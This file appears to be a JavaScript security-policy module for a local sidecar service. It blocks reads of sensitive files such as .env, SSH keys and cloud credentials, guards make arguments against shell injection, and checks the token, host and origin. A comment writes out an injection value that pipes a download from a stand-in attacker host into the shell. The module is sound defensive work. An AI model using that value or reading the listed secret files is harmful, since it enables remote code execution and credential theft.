'use strict'
// Single source of truth for sidecar-side access policy. Both the HTTP file
// endpoints (server.js) and the builtin file tools (builtin-exec.js) call in
// here, so a new rule cannot be added to one and forgotten in the other.
const path = require('path')
const crypto = require('crypto')
const fs = require('fs')

// /api/file reads a whole file into memory; cap it to avoid an OOM on a big
// log or database that happens to sit inside an allowed root.
const MAX_PREVIEW_BYTES = 2 * 1024 * 1024

// FS_ROOTS deliberately includes the whole <workspace>/work tree (the repo
// scanner and mapRepoAlias need it), and this very project lives under
// work/harness/. That means its own .env is "inside the roots". A containment
// check alone is therefore NOT enough — deny sensitive names explicitly.
const SENSITIVE_BASENAME = [
  /^\.env(\..*)?$/i,
  /^id_(rsa|dsa|ed25519|ecdsa)$/i,
  /\.(pem|key|p12|pfx|keystore|jks)$/i,
  /^credentials(\..*)?$/i,
  /^\.(netrc|npmrc|pypirc|htpasswd)$/i,
  /^kubeconfig$/i,
  // Credential dumps only. Keep this anchored to a short extension list so
  // ordinary docs like password-policy.md or tokenizer.c stay readable.
  /^(secrets?|passwords?|api[_-]?keys?)\.(json|ya?ml|toml|txt|ini|conf|env|csv)$/i,
]
const SENSITIVE_DIR = /(^|\/)(\.ssh|\.aws|\.gnupg|\.kube)(\/|$)/i

function isSensitivePath(abs) {
  const p = path.resolve(abs)
  const base = path.basename(p)
  // Public templates carry no secrets; keep them readable for onboarding.
  if (/^\.env\.(example|sample|template|dist)$/i.test(base)) return false
  if (SENSITIVE_BASENAME.some((re) => re.test(base))) return true
  return SENSITIVE_DIR.test(p.replace(/\\/g, '/'))
}

// Constant-time comparison. A plain !== on the token leaks its prefix through
// response timing, and an array-valued header (duplicate headers) must never
// accidentally match.
function tokenMatches(provided, expected) {
  if (typeof provided !== 'string' || typeof expected !== 'string' || expected.length === 0) return false
  const a = Buffer.from(provided)
  const b = Buffer.from(expected)
  return a.length === b.length && crypto.timingSafeEqual(a, b)
}

// ---- make variable injection guard -------------------------------------
// runMakeIn passes `KEY=value` as argv (there is NO shell on the Node side),
// but GNU make expands `$(KEY)` into a recipe that /bin/sh DOES interpret.
// `ARGS=--sort daily; curl evil.sh | sh` therefore used to execute arbitrary
// commands on the host. Keep the value allowlist deliberately narrow: CLI
// flags, project slugs, dates and paths all fit; shell metacharacters do not.
// Applies to EVERY runMakeIn call (dev-stats / article-* / asset-lens), so a
// new tool cannot silently reintroduce the hole.
const SAFE_MAKE_KEY = /^[A-Za-z_][A-Za-z0-9_]*$/
const SAFE_MAKE_VALUE = /^[\p{L}\p{N} _.,:@\/+=%-]+$/u
const MAX_MAKE_VALUE_LEN = 2048

function isSafeMakeVarValue(value) {
  if (typeof value !== 'string') return false
  if (value.length === 0) return true
  if (value.length > MAX_MAKE_VALUE_LEN) return false
  return SAFE_MAKE_VALUE.test(value)
}

// Returns human-readable reasons for each rejected argument ([] = all safe).
function unsafeMakeArgs(makeArgs) {
  const bad = []
  for (const arg of makeArgs || []) {
    const s = String(arg)
    const eq = s.indexOf('=')
    if (eq < 0) continue // bare make target: validated by each business tool
    const key = s.slice(0, eq)
    const value = s.slice(eq + 1)
    if (!SAFE_MAKE_KEY.test(key)) {
      bad.push(`${s}: invalid make variable name`)
    } else if (!isSafeMakeVarValue(value)) {
      bad.push(`${s.split('=')[0]}=<value>: shell metacharacter or over ${MAX_MAKE_VALUE_LEN}B`)
    }
  }
  return bad
}

// ---- loopback control-plane auth ----------------------------------------
// Read ONLY the SIDECAR_TOKEN line. Launcher is started with nohup (no .env
// sourced), and dumping/parsing the whole .env here would leak business config
// into a process that can fork host processes. Re-read on each control request
// so rotating the token does not require restarting launcher.
function readEnvToken(envPath) {
  try {
    const line = fs.readFileSync(envPath, 'utf8')
      .split(/\r?\n/)
      .find((l) => /^\s*SIDECAR_TOKEN\s*=/.test(l))
    if (!line) return ''
    return line.slice(line.indexOf('=') + 1).trim().replace(/^['"]|['"]$/g, '')
  } catch {
    return ''
  }
}

const LOOPBACK_HOSTNAMES = new Set(['127.0.0.1', 'localhost', '[::1]', '::1'])
function hostName(hostHeader) {
  if (typeof hostHeader !== 'string') return ''
  const raw = hostHeader.toLowerCase().trim()
  return raw.startsWith('[') ? raw.slice(0, raw.indexOf(']') + 1) : raw.split(':')[0]
}
function isLoopbackHost(hostHeader) {
  return LOOPBACK_HOSTNAMES.has(hostName(hostHeader))
}
// Non-browser clients (curl / make) send no Origin. A browser cross-site POST
// carries its own Origin, which must be the same local site — this blocks both
// CSRF and DNS rebinding (where Host would be attacker.com).
function isAllowedOrigin(origin, hostHeader) {
  if (!origin) return true
  try {
    const u = new URL(origin)
    return (u.protocol === 'http:' || u.protocol === 'https:') &&
      (u.host === String(hostHeader || '').toLowerCase().trim() ||
        LOOPBACK_HOSTNAMES.has(u.hostname))
  } catch {
    return false
  }
}
function checkControlAuth({ provided, expected, host, origin }) {
  if (!isLoopbackHost(host)) return { ok: false, code: 403, reason: 'host not allowed' }
  if (!isAllowedOrigin(origin, host)) return { ok: false, code: 403, reason: 'origin not allowed' }
  if (!tokenMatches(provided, expected)) return { ok: false, code: 401, reason: 'unauthorized' }
  return { ok: true }
}

module.exports = { isSensitivePath, tokenMatches, MAX_PREVIEW_BYTES,
                   isSafeMakeVarValue, unsafeMakeArgs, readEnvToken,
                   isLoopbackHost, isAllowedOrigin, checkControlAuth }
